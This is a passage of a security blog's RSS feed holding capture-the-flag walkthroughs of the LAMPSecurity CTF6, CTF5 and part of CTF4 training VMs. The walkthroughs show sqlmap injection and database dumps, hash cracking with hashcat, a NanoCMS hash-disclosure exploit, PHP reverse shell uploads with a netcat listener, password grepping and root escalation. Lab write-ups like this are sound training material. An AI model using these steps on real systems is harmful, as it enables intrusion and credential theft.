&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;SQLMap form enumeration:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# sqlmap &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.221.131/?action=login&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--forms&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; cms
&lt;span class=&quot;nt&quot;&gt;--tables&lt;/span&gt;

Database: cms
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;3 tables]
+-------+
| user  |
| event |
| log   |
+-------+&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;SQLMap database dump + admin account hash cracked:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# sqlmap &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.221.131/?action=login&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--forms&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; cms
&lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; user &lt;span class=&quot;nt&quot;&gt;--dump&lt;/span&gt;

Database: cms
Table: user
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 entry]
+---------+---------------+----------------------------------------------+
| user_id | user_username | user_password                                |
+---------+---------------+----------------------------------------------+
| 1       | admin         | 25e4ee4e9229397b6b17776bfceaf8e7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adminpass&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |
+---------+---------------+----------------------------------------------+&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;web-application-exploitation&quot;&gt;Web Application Exploitation&lt;/h2&gt;

&lt;p&gt;Using the previously discovered admin account credentials, it was possible to login to the web application and upload a php reverse shell using an image upload form.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf6/webshell.png&quot; alt=&quot;PHP Web Shell Upload&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;local-privilege-escalation&quot;&gt;Local Privilege Escalation&lt;/h2&gt;

&lt;p&gt;A successful reverse shell was establish and the kernel appeared to be
vulnerable to a well know &lt;a href=&quot;https://www.exploit-db.com/exploits/8478/&quot;&gt;Linux 2.6 kernel udev
exploit&lt;/a&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sh-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ar&lt;/span&gt;
Linux localhost.localdomain 2.6.18-92.el5 &lt;span class=&quot;c&quot;&gt;#1 SMP Tue Jun 10 18:49:47 EDT 2008&lt;/span&gt;
i686 i686 i386 GNU/Linux&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The exploit requires the PID for the udev process, the exploit does not work
flawlessly as you can see below it may take several attempts to get a root
shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf6/exploit-process-udev-pid.png&quot; alt=&quot;Exploit Process UDEV PID&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Thanks for the VM :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>LAMP Security CTF5 - Walkthrough</title>
          <link>https://highon.coffee/blog/lamp-security-ctf5-walkthrough/</link>
          <pubDate>Sat, 08 Feb 2014 12:00:59 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>CTF</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/lamp-security-ctf5-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#author-description&quot; id=&quot;markdown-toc-author-description&quot;&gt;Author Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration&quot; id=&quot;markdown-toc-enumeration&quot;&gt;Enumeration&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#host-service-enumeration&quot; id=&quot;markdown-toc-host-service-enumeration&quot;&gt;Host Service Enumeration&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#http-enumeration&quot; id=&quot;markdown-toc-http-enumeration&quot;&gt;HTTP Enumeration&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#forced-browsing&quot; id=&quot;markdown-toc-forced-browsing&quot;&gt;Forced Browsing&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#web-application-enumeration&quot; id=&quot;markdown-toc-web-application-enumeration&quot;&gt;Web Application Enumeration&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#hash-disclosure&quot; id=&quot;markdown-toc-hash-disclosure&quot;&gt;Hash Disclosure&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#verified-hash-type&quot; id=&quot;markdown-toc-verified-hash-type&quot;&gt;Verified Hash Type&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#hashcat-md5-cracking&quot; id=&quot;markdown-toc-hashcat-md5-cracking&quot;&gt;Hashcat md5 cracking&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#web-application-exploitation&quot; id=&quot;markdown-toc-web-application-exploitation&quot;&gt;Web Application Exploitation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#linux-local-enumeration&quot; id=&quot;markdown-toc-linux-local-enumeration&quot;&gt;Linux Local Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-privilege-escalation&quot; id=&quot;markdown-toc-local-privilege-escalation&quot;&gt;Local Privilege Escalation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;author-description&quot;&gt;Author Description&lt;/h2&gt;

&lt;p&gt;The LAMPSecurity project is an effort to produce training and benchmarking
tools that can be used to educate information security professionals and test
products.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; madirish2600&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;VulnHub&lt;/a&gt; via &lt;a href=&quot;https://twitter.com/VulnHub&quot;&gt;@VulnHub&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;h3 id=&quot;host-service-enumeration&quot;&gt;Host Service Enumeration&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1-65535 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; 192.168.30.130&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;note info&quot;&gt;
  &lt;h5&gt;Dislcaimer: Multiple Entry Points&lt;/h5&gt;
  &lt;p&gt;The LAMPSecurity series is not particularly challenging, for each VM in the series I've targeted the &lt;b&gt;web application&lt;/b&gt; as the entry point.&lt;/p&gt;
&lt;/div&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 22&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;SSH&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;OpenSSH 4.7 (protocol 2.0)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 25&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;SMTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Sendmail 8.14.1/8.14.1&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 80&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTPD&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.2.6 ((Fedora))&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 110&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;POP3&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;ipop3d 2006k.101&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
          &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 111&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;rpcbind&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;N/A&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 138&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;netbios-ssn&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Samba smbd 3.X&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 143&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;IMAP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;University of Washington IMAP imapd&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 445&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;netbios-ssn&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Samba smbd 3.X (workgroup: MYGROUP)&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP:901 &lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Samba SWAT administration server&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP:3306 &lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;MySQL&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;MySQL 5.0.45&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP:36644 &lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;RPC&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;RPC&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP:36644 &lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
              &lt;pc&gt;&lt;p&gt;RPC&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;RPC&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;http-enumeration&quot;&gt;HTTP Enumeration&lt;/h3&gt;

&lt;p&gt;Inspection of the Web Application revealed the blog used a URL path of &lt;code&gt;/~andy/&lt;/code&gt;, indicating it was serving an Apache home dir - username enumeration is possible. Further inspection of the web application indicated the use of GET requests &lt;code&gt;/?page=contact&lt;/code&gt;,&lt;/p&gt;

&lt;h4 id=&quot;forced-browsing&quot;&gt;Forced Browsing&lt;/h4&gt;

&lt;p&gt;Dirbuster revealed the directory &lt;code&gt;/~andy/data/nanoadmin.php&lt;/code&gt;,
indicating the site used NanoCMS (this was confirmed by viewing the page
source code).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf5/dirbuster.png&quot; alt=&quot;OWASP DirBuster&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;web-application-enumeration&quot;&gt;Web Application Enumeration&lt;/h2&gt;

&lt;p&gt;Viewing the web application disclosed the application used “NanoCMS”, this
information was also previously discovered using Dirbuster. Research indicated a NanoCMS
vulnerability existed that disclosed the applications password hashes.
&lt;a href=&quot;http://www.securityfocus.com/bid/34508/exploit&quot;&gt;http://www.securityfocus.com/bid/34508/exploit&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;hash-disclosure&quot;&gt;Hash Disclosure&lt;/h3&gt;

&lt;p&gt;Admin hases were successfully retrived using the discovered NanoCMS exploit:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf5/nanocms-vuln-hash.png&quot; alt=&quot;NanoCMS Hash Expose Vuln&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;verified-hash-type&quot;&gt;Verified Hash Type&lt;/h3&gt;

&lt;p&gt;Hash Identifier was used to confirm the hash was md5.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf5/hash-identifier.png&quot; alt=&quot;Hash Identifier&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;hashcat-md5-cracking&quot;&gt;Hashcat md5 cracking&lt;/h2&gt;

&lt;p&gt;Hashcat was used to crack the hash.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# hashcat -m 0 -a 0 ctf5-hash.txt /usr/share/wordlists/rockyou.txt&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Discovered password: &lt;code&gt;9d2f75377ac0ab991d40c91fd27e52fd:shannon&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;web-application-exploitation&quot;&gt;Web Application Exploitation&lt;/h2&gt;

&lt;p&gt;Authentication was successful using the previously cracked hash credential. I
new page was created containing php reverse shell code:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf5/nanocms-webshell.png&quot; alt=&quot;NanoCMS PHP Reverse Shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A netcat reverse handler was setup &lt;code&gt;nc -n -v -l -p 443&lt;/code&gt;, the shell
successfully connected back.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/ctf5/rev-shell.png&quot; alt=&quot;php reverse shell&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;linux-local-enumeration&quot;&gt;Linux Local Enumeration&lt;/h2&gt;

&lt;p&gt;Enumeration indicated &lt;code&gt;/home/&lt;/code&gt; directories were readable.&lt;/p&gt;

&lt;p&gt;Grep’ing for the string &lt;strong&gt;password&lt;/strong&gt; discovered the following:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sh-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; password /home/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;

Discovered the file:

/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:  &amp;lt;title&amp;gt;Root
password&amp;lt;/title&amp;gt;
/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:  &amp;lt;text
xml:space&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;preserve&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;note-content &lt;span class=&quot;nv&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0.1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;Root password
/home/patrick/.tomboy/481bca0d-7206-45dd-a459-a72ea1131329.note:Root password&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The file contained the root credentials.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Username&lt;/th&gt;
      &lt;th&gt;Password&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;root&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;50$cent&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;local-privilege-escalation&quot;&gt;Local Privilege Escalation&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sh-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su -
standard &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;must be a &lt;span class=&quot;nb&quot;&gt;tty
&lt;/span&gt;sh-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/sh&quot;)'&lt;/span&gt;
bash-3.2&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su -
su -
Password: 50&lt;span class=&quot;nv&quot;&gt;$cent&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost ~]# &lt;span class=&quot;nb&quot;&gt;whoami
whoami
&lt;/span&gt;root
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@localhost ~]# &lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;bin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,6&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;disk&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,10&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;wheel&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;system_u:system_r:httpd_t:s0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Thanks for the VM :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>LAMP Security CTF4 - Walkthrough</title>
          <link>https://highon.coffee/blog/lamp-security-ctf4-walkthrough/</link>
          <pubDate>Fri, 10 Jan 2014 18:00:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>CTF</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/lamp-security-ctf4-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#author-description&quot; id=&quot;markdown-toc-author-description&quot;&gt;Author Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration&quot; id=&quot;markdown-toc-enumeration&quot;&gt;Enumeration&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#port-scanning&quot; id=&quot;markdown-toc-port-scanning&quot;&gt;Port Scanning&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#service-enumeration&quot; id=&quot;markdown-toc-service-enumeration&quot;&gt;Service Enumeration&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#http-enumeration&quot; id=&quot;markdown-toc-http-enumeration&quot;&gt;HTTP Enumeration&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#lfi-exploit&quot; id=&quot;markdown-toc-lfi-exploit&quot;&gt;LFI Exploit&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sqlmap-enumeration&quot; id=&quot;markdown-toc-sqlmap-enumeration&quot;&gt;SQLMap Enumeration&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#sqlmap&quot; id=&quot;markdown-toc-sqlmap&quot;&gt;SQLMap&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#sqlmap-dump-hahes--crack-hashes&quot; id=&quot;markdown-toc-sqlmap-dump-hahes--crack-hashes&quot;&gt;SQLMap Dump Hahes + Crack hashes&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#ssh-login&quot; id=&quot;markdown-toc-ssh-login&quot;&gt;SSH Login&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#linux-local-privilege-escalation&quot; id=&quot;markdown-toc-linux-local-privilege-escalation&quot;&gt;Linux Local Privilege Escalation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#post-exploitation-enumeration&quot; id=&quot;markdown-toc-post-exploitation-enumeration&quot;&gt;Post Exploitation Enumeration&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;author-description&quot;&gt;Author Description&lt;/h2&gt;

&lt;p&gt;The LAMPSecurity project is an effort to produce training and benchmarking tools that can be used to educate information security professionals and test products. Please note there are other capture the flag exercises (not just the latest one). Check the SourceForge site to find other exercises available (http://sourceforge.net/projects/lampsecurity/files/CaptureTheFlag/).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; madirish2600&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com&quot;&gt;VulnHub&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1-65535 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; 192.168.30.147&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;div class=&quot;note info&quot;&gt;
  &lt;h5&gt;Dislcaimer: Multiple Entry Points&lt;/h5&gt;
